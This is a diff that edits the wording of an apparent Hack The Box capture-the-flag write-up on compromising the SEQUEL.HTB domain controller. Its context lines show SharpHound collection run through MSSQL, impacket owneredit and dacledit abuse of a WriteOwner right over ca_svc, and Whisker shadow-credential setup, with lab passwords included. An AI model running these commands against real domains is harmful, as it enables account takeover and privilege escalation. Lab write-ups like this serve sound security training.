@@ -246,7 +246,7 @@ MSSQL       10.10.11.51     1433   DC01             [*] Size is 1286656 bytes
 MSSQL       10.10.11.51     1433   DC01             [+] File has been uploaded on the remote machine
 ```
 
-I used the `-c all` flag to collect everything that it c
+I used the `-c all` flag to collect everything that it can.
 ```powershell
 pwd
 C:\users\public
@@ -254,7 +254,7 @@ C:\users\public
 .\SharpHound.exe -c all --zipfilename loot.zip
 ```
 
-Downloaded enumeration results for analysis:
+Then downloaded the results to my machine for analysis via `BloodHound`.
 ```powershell
 nxc mssql 'DC01' -u 'sa'  -p 'MSSQLP@ssw0rd!' --local-auth --get-file 'C:\Users\Public\20250615120137_loot.zip' loot.zip
 
@@ -264,12 +264,12 @@ nxc mssql 'DC01' -u 'sa'  -p 'MSSQLP@ssw0rd!' --local-auth --get-file 'C:\Users\
 
 ### WriteOwner Permission Abuse
 
-BloodHound analysis revealed that `ryan` possessed `WriteOwner` permissions over `ca_svc`, a certificate services account and member of the Certificate Publishers group. WriteOwner permissions allowed complete account takeover through ownership change and DACL modification:
+BloodHound analysis revealed that `ryan` possessed `WriteOwner` permissions over `ca_svc`, a certificate services account and member of the `Certificate Publishers` group. The `WriteOwner` permissions allowed complete account takeover through ownership change and DACL modification.
 ```powershell
 impacket-owneredit -action write -new-owner ryan -target ca_svc 10.10.11.51/ryan:WqSZAF6CysDQbGb3   
 ```
 
-Ownership transfer enabled DACL modification to grant full control over the target account:
+Ownership transfer enabled DACL modification to grant full control over the target account.
 ```bash
 impacket-dacledit -action write -target ca_svc -principal ryan DC01.SEQUEL.HTB/ryan:WqSZAF6CysDQbGb3
 ```
@@ -277,7 +277,6 @@ impacket-dacledit -action write -target ca_svc -principal ryan DC01.SEQUEL.HTB/r
 ### Key Credential Link Manipulation
 
 Account takeover allowed certificate-based authentication configuration, bypassing traditional password authentication:
-
 ```powershell
 .\Whisker.exe add /target:ca_svc
 ...
